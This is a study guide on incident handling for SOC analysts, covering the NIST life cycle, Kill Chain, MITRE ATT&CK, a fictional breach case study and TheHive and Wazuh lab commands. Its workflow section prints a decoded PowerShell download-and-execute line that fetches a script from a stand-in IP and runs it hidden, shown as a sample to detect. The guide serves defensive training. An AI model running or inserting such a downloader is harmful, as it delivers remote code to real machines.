# Incident Handling: Field Guide

A study guide covering incident handling concepts, the NIST incident response life cycle, the Cyber Kill Chain, MITRE ATT&CK, the Pyramid of Pain, and a full case study of the Insight Nexus breach. It also includes TheHive and Wazuh workflows for SOC analysts and incident responders.

---

## Table of Contents

1. [Core Definitions](#1-core-definitions)
2. [Incident Response Life Cycle](#2-incident-response-life-cycle)
3. [Cyber Kill Chain](#3-cyber-kill-chain)
4. [MITRE ATT&CK Framework](#4-mitre-attck-framework)
5. [Pyramid of Pain](#5-pyramid-of-pain)
6. [Stage 1: Preparation](#6-stage-1-preparation)
7. [Stage 2: Detection and Analysis](#7-stage-2-detection-and-analysis)
8. [Stage 3: Containment, Eradication, and Recovery](#8-stage-3-containment-eradication-and-recovery)
9. [Stage 4: Post-Incident Activity](#9-stage-4-post-incident-activity)
10. [Real-World Incident Examples](#10-real-world-incident-examples)
11. [Case Study: Insight Nexus Breach](#11-case-study-insight-nexus-breach)
12. [Practical Workflows (TheHive and Wazuh)](#12-practical-workflows-thehive-and-wazuh)
13. [Key Takeaways Cheat Sheet](#13-key-takeaways-cheat-sheet)

---

## 1. Core Definitions

| Term | Definition |
|---|---|
| **Event** | Any action occurring in a system or network, such as an email being sent, a mouse click, or a firewall allowing a connection |
| **Incident** | An event with a negative consequence, such as a system crash, unauthorized access, or a natural disaster |
| **IT security incident** | An event with clear intent to harm a computer system, such as data theft, malware installation, or unauthorized access |
| **Incident handling (IH)** | A defined set of procedures for managing and responding to security incidents |

### Important notes

- Not all incidents are intrusions. Malicious insiders, availability problems, and intellectual property loss are also in scope.
- Treat suspicious events as incidents until proven otherwise.
- An **Incident Response Team (IRT)** is a trained team that responds systematically to minimize theft and disruption.
- An **Incident Manager** leads the team. This is often the SOC manager, the CISO or CIO, or a trusted vendor. The manager is the single point of communication and has authority to direct any employee.
- Key reference: NIST's *Computer Security Incident Handling Guide*.

---

## 2. Incident Response Life Cycle

```text
┌──────────────────────────────────────────────────────┐
│ PREPARATION <── continuous ──> DETECTION             │
│ (build capability)              (hunt)               │
└────────────────────────┬─────────────────────────────┘
                         │ incident detected
                         ▼
┌──────────────────────────────────────────────────────┐
│ CONTAINMENT -> ERADICATION -> RECOVERY               │
└────────────────────────┬─────────────────────────────┘
                         │ fully handled
                         ▼
┌──────────────────────────────────────────────────────┐
│ POST-INCIDENT ACTIVITY (report and lessons learned)  │
└────────────────────────┬─────────────────────────────┘
                         │
                         └──> feeds back into PREPARATION
```

### Key principles

- The life cycle is cyclic, not linear. New evidence changes the plan.
- Do not skip stages. Complete one before moving to the next.
- Keep preparation and detection running during active response.
- Partial containment alerts the attacker. Contain everything, then eradicate.

---

## 3. Cyber Kill Chain

The Kill Chain describes the attacker's lifecycle. Knowing which stage an attacker has reached shows how far the intrusion has progressed.

```text
Recon -> Weaponize -> Deliver -> Exploit -> Install -> C2 -> Action
```

| # | Stage | Description | Examples |
|---|---|---|---|
| 1 | Recon | Target selection and information gathering | Passive: job ads, social media. Active: port scanning, network mapping |
| 2 | Weaponize | Malware built and embedded in an exploit or payload | A lightweight, persistent remote access tool |
| 3 | Deliver | Payload transmitted to the victim | Phishing, malicious web pages, pretexting by phone, USB drops |
| 4 | Exploit | Payload triggered | Code runs and gains access or control |
| 5 | Install | Foothold established | Droppers, backdoors, rootkits |
| 6 | Command and control (C2) | Remote control established | Modular stagers, multiple malware variants for resilience |
| 7 | Action | Objective achieved | Data exfiltration, ransomware deployment |

### Critical insights

- Attacks are not linear. Stages repeat. After installing a foothold, attackers often return to reconnaissance to find deeper targets.
- The goal is to stop the attacker as early in the chain as possible.

### Common techniques

- **Droppers** install and execute malware.
- **Backdoors** maintain access for further attacks or data theft.
- **Rootkits** hide the attacker's presence and evade antivirus and security tools.

---

## 4. MITRE ATT&CK Framework

ATT&CK is a matrix-based knowledge base of adversary tactics and techniques.

| Level | Definition | Example |
|---|---|---|
| Tactic | High-level goal during an intrusion | Initial Access, Persistence, Privilege Escalation, Credential Access, Lateral Movement, Impact |
| Technique | A specific method for achieving a tactic (has an ID) | T1105 Ingress Tool Transfer; T1021 Remote Services |
| Sub-technique | A specific implementation (extends the parent ID) | T1003.001 LSASS Memory; T1021.002 SMB/Windows Admin Shares |

### Common techniques

| Technique | ID | Tactic or use |
|---|---|---|
| Active Scanning | T1595 | Reconnaissance |
| Valid Accounts | T1078 | Initial access, persistence, privilege escalation |
| Exploit Public-Facing Application | T1190 | Initial access |
| Server Software Component (web shell) | T1505 | Persistence |
| Windows Service | T1543.003 | Persistence |
| Scheduled Task | T1053 | Persistence |
| LSASS Memory Dumping | T1003.001 | Credential access |
| Windows Credential Manager | T1555, T1555.004 | Credential access |
| Remote Desktop Protocol | T1021.001 | Lateral movement |
| PowerShell | T1059.001 | Execution |
| Ingress Tool Transfer | T1105 | Command and control |
| Web Protocols (HTTPS C2) | T1071.001 | Command and control |
| Archive Collected Data | T1560 | Exfiltration |
| Exfiltration Over C2 Channel | T1041 | Exfiltration |
| Data Encrypted for Impact | T1486 | Impact (ransomware) |

### Why it matters

- Sub-techniques allow precise reporting, such as "we detected T1003.001, LSASS memory dumping."
- Mapping findings to ATT&CK IDs supports reporting, prioritization, and response.
- Use ATT&CK to understand adversary intent, prioritize alerts, and select mitigations.

---

## 5. Pyramid of Pain

The pyramid shows how much effort an adversary must spend to change tactics when defenders block each type of indicator.

```text
            ▲ TTPs (ATT&CK)            Tough     (maximum pain for the attacker)
           ▲ Tools                     Challenging
          ▲ Network and host artifacts Annoying
         ▲ Domain names                Simple
        ▲ IP addresses                 Easy
       ▲ Hash values                   Trivial   (easily changed)
```

| Indicator | Difficulty for attacker to change | Defensive value |
|---|---|---|
| Hash, IP | Trivial to easy | Low. Attacker recompiles or switches servers |
| Domain | Simple | Low to medium |
| Network and host artifacts (registry keys, mutexes) | Annoying | Medium |
| Tools | Challenging | High |
| TTPs | Tough | Maximum. Forces a fundamental change in operations |

Detection built on behavior (TTPs) is more durable than detection built on hashes and IPs.

---

## 6. Stage 1: Preparation

### Two objectives

1. Build incident handling capability: team, policies, and tools.
2. Protect against and prevent incidents: hardening, Active Directory tiering, MFA, and privileged access management.

### Five prerequisites

1. Skilled incident handling staff. Outsourcing is possible, but basic in-house capability is needed.
2. A trained workforce, through security awareness activities.
3. Clear policies and documentation.
4. Tools, both software and hardware.
5. Incident handling capability within the organization.

### Documentation to maintain

- **People and contacts:** the IH team, legal, compliance, management, IT support, communications, law enforcement, ISPs, facilities, and any external IRT.
- **Policies:** IR policy, plan, and procedures; information sharing rules; forensic cheat sheets.
- **Technical baselines:** system and network baselines (golden images), network diagrams, and an asset database.
- **Special access:** on-demand privileged accounts, enabled when an incident is confirmed and disabled, with the password reset, afterward.
- **Fast procurement:** a way to acquire tools without the full purchasing process.

### Reporting capability

Capture timestamps, activities, results, and who performed each action. Answer the 5W+H: who, what, when, where, why, and how.

### The jump bag

| Category | Contents |
|---|---|
| Forensic workstations | A dedicated laptop per team member, with antivirus disabled, plus disk images and log analysis tools |
| Forensic tools | Image acquisition and analysis, memory capture, live response |
| Analysis tools | Log analysis, network capture |
| Hardware | Cables, switches, write blockers, imaging drives, screwdrivers |
| Process | IOC creator, chain-of-custody forms, encryption software, ticketing |
| Facilities | Secure storage, and an IH system independent of the organization's infrastructure |

**Assume full compromise.** Documentation and communication systems must be independent of the organization's infrastructure. Assume the adversary controls everything and can read email.

### Protective measures

| Measure | Description |
|---|---|
| DMARC | Rejects spoofed email. Built on SPF and DKIM. Test it first to avoid blocking legitimate mail |
| Endpoint hardening | CIS or Microsoft baselines; disable LLMNR and NetBIOS; LAPS; constrained language mode for PowerShell; ASR rules; application allowlisting; block execution from user-writable folders; host firewalls; EDR with AMSI integration |
| Network protection | Segmentation; IDS and IPS with TLS inspection; 802.1X; conditional access |
| Identity management | Passphrases over complex passwords; MFA for all administrative access |
| Vulnerability management | Continuous scanning; remediate High and Critical findings; segment systems when patches are unavailable |
| User awareness | Train staff to recognize and report suspicious behavior; run surprise phishing tests and USB drop exercises |
| AD security assessment | Review from an attacker's perspective; remove easy escalation paths |
| Purple team exercises | Red and blue teams work together to find gaps and test detection and response |

---

## 7. Stage 2: Detection and Analysis

### Detection sources

- An employee notices abnormal behavior.
- A tool alerts: EDR, IDS, firewall, or SIEM.
- Threat hunting.
- A third-party notification.

### Detection layers

| Layer | Controls |
|---|---|
| Network perimeter | Firewalls, NIDS and NIPS, DMZ |
| Internal network | Local firewalls, HIDS and HIPS |
| Endpoint | Antivirus, EDR |
| Application | Application and service logs |

### Initial investigation: establish context first

Collect:

- **When and who:** the date and time reported, and who detected or reported it.
- **How:** how it was detected.
- **What:** the nature of the incident, such as phishing or system unavailability.
- **Impacted systems:** a list of them.
- **Access and actions:** who accessed what, and whether the activity is ongoing or stopped.
- **System details:** location, OS, IP addresses, hostnames, owner, purpose, and current state.
- **Malware details:** IP addresses, detection time, malware type, affected systems, and hashes.

Context changes decisions. A compromised CEO laptop is a different problem from a compromised intern laptop.

### Incident timeline

| Date | Time | Hostname | Event | Data source |
|---|---|---|---|---|
| 09/09/2021 | 13:31 CET | SQLServer01 | Hacking tool Mimikatz detected | Antivirus |

A timeline keeps the investigation organized, shows the overall picture, and reveals connections between events.

### Severity and extent questions

- What is the impact of exploitation?
- What does exploitation require?
- Can business-critical systems be affected?
- Are remediation steps suggested?
- How many systems are affected?
- Is the exploit used in the wild? This indicates sophistication.
- Does the exploit have worm-like behavior? This also indicates sophistication.

### Confidentiality and communication

- Share information on a need-to-know basis, unless law or management directs otherwise.
- The adversary may be an employee.
- Breach communication is handled by an appointed person, under the direction of the legal department.
- Set expectations when the investigation starts: its type, evidence sources, and time estimate.
- Keep management informed as the investigation evolves.

### The investigation loop

```text
Initial investigation data
        │
        ▼
① Create and use IOCs
② Identify new leads and impacted systems
③ Collect and analyze data from new leads and systems
        │
        └──> repeat as the investigation evolves
```

Do not narrow the investigation to a single finding. Doing so leads to premature conclusions.

### Indicators of compromise (IOCs)

An IOC is a documented artifact of a compromise, such as an IP address, file hash, file name, domain, or registry key.

| Standard or tool | Purpose |
|---|---|
| OpenIOC | Language for documenting and sharing IOCs |
| YARA | Widely used standard for describing IOCs |
| Mandiant IOC Editor | Free tool for creating and editing IOCs |
| STIX | Open, machine-readable JSON format for exchanging threat intelligence, used by CISA |

### Know your tools: credential caching

| Tool | Credential caching |
|---|---|
| WinRM | No caching. Logon type 3 (network logon) |
| PsExec with explicit credentials | Caches credentials on the remote machine |
| PsExec from the current user session | No caching |

### Data collection

| Approach | When to use | Risk |
|---|---|---|
| Live response (most common) | System is running. Collect predefined, artifact-rich data | Keep interaction minimal to avoid altering evidence |
| Shut down and analyze | When required | Loses RAM artifacts, which exist only in memory |

### Analysis types

- Malware analysis (most common)
- Disk forensics (most common)
- Memory forensics (increasingly important for advanced attacks)

Maintain a chain of custody throughout collection. This keeps evidence admissible in court.

### AI in detection

Tools such as Elastic Security's Attack Discovery use language models to analyze large numbers of detections, cluster related alerts into an attack narrative, show relationships among users and hosts, and map activity to ATT&CK.

| Use case | Benefit |
|---|---|
| Automated triage and prioritization | Focus on what matters |
| Correlation and timeline reconstruction | See the full picture |
| Automated response playbooks | Faster containment |
| Post-incident analysis | Better future defense |

---

## 8. Stage 3: Containment, Eradication, and Recovery

### When it begins

The investigation is complete, the incident type is understood, and the business impact is assessed.

### Response flow

```text
Investigation complete
  -> Containment strategy
  -> Evidence gathering (preserve evidence)
  -> Identify attacking hosts
  -> Eradication and recovery
  -> Return systems to normal operation
```

### Containment

**Critical rule:** coordinate containment across all affected systems and execute it simultaneously. Acting on only some systems tips off the attacker, who will then change tools and techniques to persist.

**Short-term containment** keeps the footprint minimal:

| Action | Purpose |
|---|---|
| Isolate the system (for example, move it to a quarantine VLAN) | Separate it from the network |
| Disconnect the network cable | Physical disconnect |
| Redirect the C2 domain | Point it at a sinkhole or a non-existent address |
| Back up evidence | Forensic images that preserve the systems without altering them |

If a shutdown is required, inform the business and obtain permission first.

**Long-term containment** makes persistent changes:

- Change user passwords
- Apply firewall rules
- Deploy host-based intrusion detection
- Apply system patches
- Shut down systems where necessary

Keep the business and stakeholders updated. Patching does not mean the incident is over.

### Eradication

The goal is to remove the root cause and everything the attacker left behind, and confirm that the adversary is out of the systems and the network.

- Remove detected malware.
- Rebuild some systems, and restore others from backup.
- Extend containment to additional patches that are not immediately required.
- Apply further hardening, often across the entire network, not just the impacted systems.

### Recovery

The goal is to return systems to normal operation.

1. The business verifies that the system works as expected and holds all necessary data.
2. The system returns to production.
3. Heavy logging and monitoring are applied, because recovered systems are likely targets again.

| Suspicious activity | Example |
|---|---|
| Unusual logons | User or service accounts never seen on that host before |
| Unusual processes | Processes that do not normally run |
| Registry changes | Locations that malware typically modifies |

Large incidents can take months and are usually handled in phases:

- **Early phase:** quick wins, low-hanging fruit, and immediate security improvements.
- **Later phase:** permanent, long-term changes that keep the organization as secure as possible.

---

## 9. Stage 4: Post-Incident Activity

### Purpose

1. Document the incident.
2. Improve capabilities based on lessons learned.

Hold the review meeting with all stakeholders, typically within a few days of the incident, once the incident report is final.

### Post-incident process

```text
Incident resolved
  -> Post-incident review and lessons-learned meeting
  -> Root cause analysis
  -> Update policies and playbooks
  -> Enhance detection and monitoring rules
  -> Knowledge sharing and awareness
  -> Report to management and close the case
```

### Questions the final report should answer

1. What happened, and when?
2. How did the team perform against plans, playbooks, policies, and procedures?
3. Did the business provide the information needed and respond promptly? What could improve?
4. What actions contained and eradicated the incident?
5. What preventive measures should be put in place?
6. What tools and resources are needed to detect and analyze similar incidents in the future?

### Value of incident reports

| Use | Benefit |
|---|---|
| Measurement | Number of incidents, time per incident, actions taken |
| Future reference | Guidance for similar incidents |
| Legal | Evidence of costs and impact if legal action follows |
| Training | Real cases for training new team members |

Also re-evaluate tools, training, readiness, team structure, and whether plans, playbooks, and policies need updating.

---

## 10. Real-World Incident Examples

| Category | Example | What happened |
|---|---|---|
| Leaked credentials | Colonial Pipeline ransomware | A password exposed on the dark web was reused on an inactive VPN account without MFA |
| Default or weak credentials | Mirai botnet (2016) | Scanned IoT devices with factory defaults such as admin/admin and built a large DDoS botnet |
| Default or weak credentials | LogicMonitor (2023) | A vendor issued weak default passwords, leading to ransomware and unauthorized access |
| Unpatched software | Equifax (2017) | A known Apache Struts flaw (CVE-2017-5638) exposed data on roughly 143 to 147 million people |
| Unpatched software | WannaCry (2017) | The EternalBlue SMB exploit hit more than 200,000 systems in over 150 countries. A patch existed but was not applied |
| Insider threat | Cash App / Block (2021) | A former employee accessed data of about 8.2 million customers, exposing weak internal controls |
| Phishing | U.S. Interior Department | An "evil twin" fake Wi-Fi network captured credentials |
| Social engineering | Twitter (2020) | Employees were manipulated into giving access to internal admin tools, used for a bitcoin scam |
| Supply chain | SolarWinds Orion (2020) | Nation-state actors inserted a backdoor into software updates, enabling espionage across government and industry |

Per the 2025 Unit 42 report, 86 percent of incidents in 2024 caused business disruption. Supply chain and cloud attacks are growing in frequency and sophistication.

---

## 11. Case Study: Insight Nexus Breach

### The victim

Insight Nexus is a mid-sized market research and analytics firm headquartered in Singapore. It serves Fortune 500 clients in IT and finance.

### Key assets

| Asset | Details |
|---|---|
| ManageEngine ADManager Plus | `manage.insightnexus.com`, internet-facing AD management on HTTPS 443 |
| Client reports portal | `portal.insightnexus.com`, PHP-based, with file upload enabled |
| Domain controller | `DC01.insight.local` |
| File server | `FS01.insight.local`, share `\\fs01\projects` |
| Database server | `DB01.insight.local`, holds sensitive databases |
| Workstations | DEV-001 through DEV-120. DEV-021 had externally exposed RDP |

### Security posture

- The perimeter firewall logged with defaults and had no threat intelligence integration.
- The basic IDS produced a high rate of false positives.
- Wazuh agents had partial coverage.
- SIEM retention was limited.

### Threat actors

| Actor | Profile | Motivation |
|---|---|---|
| Crimson Fox (primary) | State-backed. Targets IT supply chains. Uses credential theft and long-term persistence | Data exfiltration |
| Silent Jackal (secondary) | Low-skill, opportunistic. Defacements and proof-of-concept intrusions | Disruption and signaling |

### Crimson Fox timeline

| Date and time | Event |
|---|---|
| 2025-10-01 03:12:02 | Initial access through default `admin/admin` credentials on ManageEngine. The password was never changed after installation. No MFA, no WAF, and logons were not sent to the SIEM |
| 2025-10-01 03:18:32 | C2 over HTTPS to `103.112.60.117`, disguised as update traffic. Sysmon Event 3 from `java.exe`. A Java RCE vulnerability in ADManager Plus was also exploited |
| 2025-10-02 04:02:11 | Domain user and computer enumeration through the ManageEngine console. A new Domain Admin account was created |
| Later | Logged into DEV-021 over RDP with the new Domain Admin account (Event ID 4624, logon type 10, source `103.112.60.117`). Domain reconnaissance followed, then access to file shares on FS01 (Event 5140, with no alert rules in place) |
| Later | Exfiltration: data packaged as `diagnostics_data.zip`, disguised as telemetry, and uploaded over HTTPS without triggering alarms |
| 2025-10-04 02:10:45 | From DEV-021, a GPO was created with Domain Admin rights to push `java-update.msi` to every domain machine. Sysmon Event 11 showed the file written to `C:\Windows\Temp`. Sysmon Event 1 showed `msiexec /i ... /quiet`. The result was spyware and exfiltration across the domain |
| After | Activity slowed, with occasional low-rate beacons to `103.112.60.117` |

### Silent Jackal activity

- Exploited an unpatched file upload vulnerability in the PHP portal.
- Uploaded `checkme.txt` to the web root, with the signature "SilentJackal was here."
- Did not progress beyond initial access.

### How it was discovered

A SOC analyst investigating a `checkme.txt` alert, normally low priority, correlated it with other activity:

- Successful ManageEngine admin logins from foreign IP addresses
- Sysmon `msiexec` installs across many hosts
- LDAP enumeration and GPO changes
- File server compression and upload logs
- Outbound HTTPS to an unusual IP address

The analyst escalated to the IR team and opened a TheHive case.

### MITRE ATT&CK mapping

| Phase | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning | T1595 |
| Initial access | Valid Accounts (default credentials) | T1078.004 |
| Initial access | Exploit Public-Facing Application (PHP upload) | T1190 |
| Exploitation | Server Software Component (web shell) | T1505 |
| Persistence | Scheduled tasks, services, GPO-deployed MSI | T1547, T1543, T1069 |
| Command and control | Web protocols (HTTPS) | T1071.001 |
| Exfiltration | Archive collected data, then upload | T1560, T1041 |

### Response actions

1. **Case creation:** TheHive case "Insight Nexus: ManageEngine Compromise," priority Critical.
2. **Network containment:** blocked outbound traffic to `103.112.60.117` and added an IDS signature.
3. **Credential actions:** disabled the ManageEngine admin account, rotated high-privilege credentials, restricted the console to internal access, and forced password changes.
4. **Host isolation:** isolated ManageEngine, DEV-021, and the hosts that received the MSI. Suspended scheduled tasks and GPO deployments.
5. **Forensic collection:** volatile memory, process lists, registry hives, and disk images. Preserved `java-update.msi`, `diagnostics_data.zip`, and the web shells.

### Lessons learned

- Default credentials on internet-facing applications are the simplest and most damaging oversight.
- Multiple threat actors can target the same organization at once, one opportunistic and one targeted.
- Failure to correlate alerts across teams delays containment.
- Post-incident monitoring must hunt for persistence. Deleting a marker file does not remove the root cause.

---

## 12. Practical Workflows (TheHive and Wazuh)

Use the analyst account provided for your lab. Store credentials in environment variables rather than in commands or notes.

```bash
export HIVE_USER='<ANALYST_USER>'
export HIVE_PASS='<ANALYST_PASSWORD>'
export HIVE_URL='http://<TARGET_IP>:9000'
```

### Verify authentication

```bash
curl -s -u "$HIVE_USER:$HIVE_PASS" "$HIVE_URL/api/v1/user/current"
```

### Search alerts by tag

```bash
curl -s -u "$HIVE_USER:$HIVE_PASS" -X POST \
  "$HIVE_URL/api/v1/query?name=search-alert" \
  -H 'Content-Type: application/json' \
  -d '{"query":[{"_name":"listAlert"},{"_name":"filter","tags":"rule=92153"}]}' \
  | jq -r '.[] | "\(._id)\t\(.title)"'
```

### Search alerts by title

```bash
curl -s -u "$HIVE_USER:$HIVE_PASS" -X POST \
  "$HIVE_URL/api/v1/query?name=search-alert" \
  -H 'Content-Type: application/json' \
  -d '{"query":[{"_name":"listAlert"},{"_name":"filter","title":"[InsightNexus] Admin Login via ManageEngine Web Console"}]}' \
  | jq -r '.[] | "\(._id)\t\(.title)"'
```

### Fetch alert details

```bash
# Full alert
curl -s -u "$HIVE_USER:$HIVE_PASS" "$HIVE_URL/api/v1/alert/<ALERT_ID>" | jq .

# Description only
curl -s -u "$HIVE_USER:$HIVE_PASS" "$HIVE_URL/api/v1/alert/<ALERT_ID>" \
  | jq -r '.description'

# MITRE IDs
curl -s -u "$HIVE_USER:$HIVE_PASS" "$HIVE_URL/api/v1/alert/<ALERT_ID>" \
  | jq -r '.description' | grep -i 'rule.mitre.id'
```

### Extract MD5-looking hashes from an alert

```bash
curl -s -u "$HIVE_USER:$HIVE_PASS" "$HIVE_URL/api/v1/alert/<ALERT_ID>" \
  | jq -r '.description' | grep -oiE '[a-f0-9]{32}' | sort -u
```

### Decode a Base64 PowerShell command from Wazuh logs

```bash
# Find the EncodedCommand value
grep -oE 'EncodedCommand [A-Za-z0-9+/=]+' logs-wazuh.json

# Decode it
echo '<BASE64_STRING>' | base64 -d
```

Example of decoded content, which shows a download-and-execute pattern:

```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://198.51.100.24/defender/deploy-definitions.ps1');
Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -File C:\Windows\Temp\deploy-definitions.ps1'
```

### Useful jq patterns

```bash
# List all alert IDs
jq -r '.[]._id'

# Extract SourceUser from event data
jq -r '.data.win.eventdata.sourceUser'

# Filter descriptions by regex
jq -r '.description' | grep -iE 'pattern'

# Print ID, title, and tags
jq -r '.[] | "\(._id)\t\(.title)\t\(.tags)"'
```

### Wazuh field reference

| Field | Description |
|---|---|
| `data.win.system.eventID` | Windows event ID. 4688 is process creation, 4624 is successful logon, 4625 is failed logon, 7045 is new service |
| `data.win.eventdata.subjectUserName` | Account that performed the action |
| `data.win.eventdata.newProcessName` | Executable that was launched |
| `data.win.eventdata.parentProcessName` | Parent process, which reveals parent-child anomalies |
| `data.win.eventdata.commandLine` | Full command line, which reveals encoded commands |
| `data.win.eventdata.imagePath` | Service executable path, useful for persistence |
| `data.win.eventdata.hashes` | File hashes (MD5, SHA1, SHA256, IMPHASH) |
| `rule.mitre.id` | ATT&CK technique ID |
| `rule.mitre.tactic` | ATT&CK tactic |
| `rule.id` | Wazuh detection rule ID |

---

## 13. Key Takeaways Cheat Sheet

### Definitions

| Term | Meaning |
|---|---|
| IOC | Indicator of compromise: an artifact of a breach, such as a hash, IP, or domain |
| TTP | Tactics, techniques, and procedures: the highest-value target for defenders |
| Jump bag | Ready-to-go forensic toolkit |
| Chain of custody | Record of evidence handling, needed for admissibility |
| Golden image | Known-good baseline used to detect deviations |

### Framework quick reference

| Framework | Purpose | Structure |
|---|---|---|
| Cyber Kill Chain | Big picture of the attacker lifecycle | 7 stages, Recon to Action |
| MITRE ATT&CK | Detailed catalog of adversary behavior | Tactic, technique, sub-technique |
| Pyramid of Pain | Prioritizes indicator types | Hashes (low value) to TTPs (high pain) |
| NIST IH life cycle | Defender response process | Preparation, detection, containment, post-incident |

### Technique IDs to know

| Technique | ID |
|---|---|
| Ingress Tool Transfer | T1105 |
| Credential Access | T1003 |
| LSASS Memory Dumping | T1003.001 |
| Windows Credential Manager | T1555, T1555.004 |
| Valid Accounts | T1078 |
| Exploit Public-Facing Application | T1190 |
| PowerShell | T1059.001 |
| Remote Services (RDP) | T1021.001 |
| Remote Services (SMB) | T1021.002 |
| Web Protocols (C2) | T1071.001 |
| Data Encrypted for Impact | T1486 |

### Golden rules for incident handlers

- Assume full compromise. Keep communication and documentation independent of the organization's systems.
- Establish context first. IP addresses and timestamps mean little without it.
- Avoid tunnel vision. Keep following new leads.
- Contain all affected systems at the same time. Partial containment tips off the attacker.
- Do not skip stages. Finish one before starting the next.
- Preserve evidence. Keep interaction minimal and maintain chain of custody.
- Keep management informed. Expectations change as the investigation does.
- Document everything: who, what, when, where, why, and how, with timestamps.
- Know your tools. PsExec with explicit credentials caches them; WinRM does not.
- Hunt for persistence. Deleting an artifact does not remove the root cause.

### Common attack indicators

| Indicator | Meaning |
|---|---|
| `firefox.exe` spawning `mimikatz.exe` | Credential dumping through an anomalous parent-child relationship |
| `svchost.exe` spawning `firefox.exe` | Suspicious, since svchost should not launch browsers |
| `msiexec /i ... /quiet` | Silent MSI install, often pushed by GPO |
| `-EncodedCommand` in PowerShell | Obfuscated execution, often a downloader |
| `PSEXESVC` service installed | PsExec-based lateral movement or persistence |
| `C:\Windows\Temp\*.msi` | Staged payload from a GPO or dropper |
| Long-running outbound HTTPS | Exfiltration or C2 beacon |
| Domain admins logging in from external IPs | Credential compromise and lateral movement |

### Response priority

| Priority | Action |
|---|---|
| Critical | Immediate containment. Confirmed exfiltration or ransomware |
| High | Same-day investigation, likely escalation |
| Medium | Investigate within the SLA and correlate alerts |
| Low | Monitor and perform initial triage |

---

## Conclusion

Incident handling is a disciplined, cyclic process that combines:

- Proactive preparation: jump bag, policies, and hardening
- Continuous detection: SIEM, EDR, threat hunting, and trained users
- Structured investigation: context, IOCs, timeline, and ATT&CK mapping
- Coordinated containment: all systems at once
- Thorough eradication and monitored recovery
- An honest post-incident review that feeds back into preparation

Knowing both attacker frameworks (Kill Chain, ATT&CK) and the defender framework (NIST life cycle) lets analysts predict the next attacker move, prioritize alerts, contain threats without tipping off the adversary, and turn each incident into lasting improvement.
